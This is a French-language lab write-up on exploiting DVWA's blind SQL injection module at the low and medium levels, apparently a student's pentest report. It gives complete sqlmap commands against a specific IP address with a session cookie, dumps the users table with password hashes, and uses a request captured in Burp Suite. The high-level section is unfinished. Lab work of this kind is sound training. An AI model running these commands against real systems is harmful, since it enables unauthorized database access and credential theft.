# 1. SQL - Blind

## 1.1 Premier niveau - low

Nous allons utiliser SQLMAP pour trouver les bases de données et les afficher.  
Le principe est le même que pour les autres injections.

Voici la commande utilisée :

```bash
sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump --fresh-queries
```

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\9.png?msec=1736352746941)

SQLMAP identifie la base de données et en extrait des informations.

### Extraction de la table `users`

Pour afficher la base de données des utilisateurs et leurs mots de passe, nous utilisons les paramètres `-T` et `-D` :

```bash
sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump -T users -D dvwa
```

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\10.png?msec=1736352746935)

Les utilisateurs et leurs mots de passe hashés sont extraits. Pour gagner du temps, nous ne déchiffrons pas les mots de passe ici, car ils ont déjà été récupérés précédemment.

---

## 1.2 Deuxième niveau - medium

Nous utilisons Burp Suite pour capturer la requête `POST` :

![images](file://C:\Users\sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\11.png?msec=1736352746951)

### Identification des vulnérabilités

Nous utilisons la commande suivante pour exploiter la requête enregistrée dans un fichier `post.txt` :

```bash
sqlmap -r post.txt -p id
```

Le paramètre à injecter est `id`, comme indiqué dans la requête interceptée. SQLMAP identifie deux types de vulnérabilités :

- **Boolean-based blind**  
- **Time-based blind**

![images](file://C:\Users\sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\12.png?msec=1736352746938)

### Extraction des données

Nous réutilisons les mêmes paramètres pour extraire les utilisateurs et leurs mots de passe :

```bash
sqlmap -r post.txt -p id --dump -T users -D dvwa
```

---

## 1.3 Troisième niveau - high

(À compléter)
